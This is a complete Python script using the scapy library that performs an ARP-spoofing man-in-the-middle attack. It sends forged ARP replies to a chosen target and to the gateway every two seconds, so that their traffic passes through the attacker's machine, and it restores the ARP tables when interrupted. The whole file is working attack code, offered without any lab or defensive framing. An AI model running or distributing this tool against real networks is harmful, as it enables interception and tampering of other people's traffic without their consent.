#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse


def get_mac_address(ip_address):
    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]
    if len(answered_list) > 0:
        return answered_list[0][1].hwsrc


def restore(destination_ip, source_ip):
    destination_mac = get_mac_address(destination_ip)
    source_mac = get_mac_address(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    scapy.send(packet, verbose=False)


def spoof(target_ip, spoof_ip):
    target_mac_address = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac_address, psrc=spoof_ip)

    scapy.send(packet, count=4, verbose=False)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Target IP address to be spoofed")
    parser.add_argument("-g", "--gateway", dest="gateway",
                        help="Gateway IP address to be spoofed")
    options = parser.parse_args()
    # Check for empty fields
    if not options.target:
        parser.error(
            "[-] Please specify a target IP address and gateway IP to spoof, use --help for more info")
    else:
        return options


def run_spoof(target_ip, gateway_ip):
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Packets sent: " +
                  str(sent_packets_count), end="")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C... Resetting ARP tables")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)


option = get_arguments()
result = run_spoof(option.target, option.gateway)
